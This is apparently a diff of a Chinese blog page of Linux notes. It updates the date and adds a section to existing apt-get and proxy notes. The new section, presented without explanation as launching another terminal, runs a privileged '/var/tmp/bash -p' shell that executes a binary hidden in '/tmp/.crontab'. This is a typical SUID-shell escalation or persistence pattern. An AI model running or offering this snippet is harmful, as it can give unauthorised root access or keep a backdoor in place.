@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      509 字
+      531 字
     </span>
   
 
@@ -224,7 +224,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2022年5月28日 下午
+                  本文最后更新于：2022年6月21日 下午
                 
               </p>
             
@@ -282,6 +282,10 @@
 <h1 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">apt-get update # 从服务器获取全部可用的、最新的软件包列表，并缓存到本地电脑<br>apt-get upgrade # 会把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新<br>apt-get full-upgrade # 根据列表信息，对需要升级的软件包进行完整安装。也就是先删除软件，然后完整地重新安装整个软件<br>apt-get dist-upgrade # 可能会为了解决软件包冲突而删除一些已安装的软件包，也可能会为了解决软件包依赖问题安装新的软件包<br>apt list --upgradable # 根据列表对比信息，看看有哪些可更新的软件，如果没有则显示为空<br>apt-get autoremove # 更新完成之后会有一些不需要的旧组件需要清除。此时使用apt autoremove即可完成清理<br></code></pre></div></td></tr></table></figure>
 
 <h1 id="命令行代理"><a href="#命令行代理" class="headerlink" title="命令行代理"></a>命令行代理</h1><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;socks5://192.168.66.1:1080&quot;</span><br><span class="hljs-built_in">export</span> https_proxy=<span class="hljs-string">&quot;socks5://192.168.66.1:1080&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+<h1 id="启动其他终端并进行操作"><a href="#启动其他终端并进行操作" class="headerlink" title="启动其他终端并进行操作"></a>启动其他终端并进行操作</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">/var/tmp/bash -p &lt;&lt;EOT<br>	/tmp/.crontab/crontab<br>EOT<br></code></pre></div></td></tr></table></figure>
 
 
             </div>
